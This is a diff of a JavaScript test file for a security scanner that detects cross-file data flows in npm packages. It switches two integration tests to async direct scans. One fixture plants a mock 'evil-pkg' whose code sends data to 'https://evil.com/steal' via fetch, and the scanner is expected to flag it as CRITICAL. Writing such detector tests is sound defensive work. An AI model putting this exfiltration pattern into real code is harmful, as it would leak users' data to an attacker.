@@ -1,7 +1,7 @@
 const fs = require('fs');
 const path = require('path');
 const os = require('os');
-const { test, assert, assertIncludes, assertNotIncludes, runScan } = require('../test-utils');
+const { test, asyncTest, assert, assertIncludes, assertNotIncludes, runScan, runScanDirect } = require('../test-utils');
 const { buildModuleGraph, annotateTaintedExports, detectCrossFileFlows, annotateSinkExports, detectCallbackCrossFileFlows, detectEventEmitterFlows, MAX_GRAPH_NODES, MAX_GRAPH_EDGES, MAX_FLOWS, MAX_TAINT_DEPTH } = require('../../src/scanner/module-graph');
 
 function makeTmpDir() {
@@ -393,7 +393,7 @@ async function runModuleGraphTests() {
   // STEP 4 — Integration tests (CLI scan)
   // =========================================================================
 
-  test('integration: CLI scan detects cross_file_dataflow in malicious package', () => {
+  await asyncTest('integration: CLI scan detects cross_file_dataflow in malicious package (direct)', async () => {
     const tmp = makeTmpDir();
     try {
       writeFile(tmp, 'package.json', JSON.stringify({ name: 'evil-pkg', version: '1.0.0' }));
@@ -407,8 +407,7 @@ async function runModuleGraphTests() {
         fetch('https://evil.com/steal', { body: data });
       `);
 
-      const output = runScan(tmp, '--json');
-      const result = JSON.parse(output);
+      const result = await runScanDirect(tmp);
       const crossFileThreats = result.threats.filter(t => t.type === 'cross_file_dataflow');
       assert(crossFileThreats.length >= 1, 'Should detect at least 1 cross_file_dataflow threat, got: ' + crossFileThreats.length);
       assert(crossFileThreats[0].severity === 'CRITICAL', 'Severity should be CRITICAL');
@@ -420,7 +419,7 @@ async function runModuleGraphTests() {
     }
   });
 
-  test('integration: CLI scan on clean package produces no cross_file_dataflow', () => {
+  await asyncTest('integration: CLI scan on clean package produces no cross_file_dataflow (direct)', async () => {
     const tmp = makeTmpDir();
     try {
       writeFile(tmp, 'package.json', JSON.stringify({ name: 'clean-pkg', version: '1.0.0' }));
@@ -433,8 +432,7 @@ async function runModuleGraphTests() {
         console.log(add(1, 2));
       `);
 
-      const output = runScan(tmp, '--json');
-      const result = JSON.parse(output);
+      const result = await runScanDirect(tmp);
       const crossFileThreats = result.threats.filter(t => t.type === 'cross_file_dataflow');
       assert(crossFileThreats.length === 0, 'Should have no cross_file_dataflow threats, got: ' + crossFileThreats.length);
     } finally {
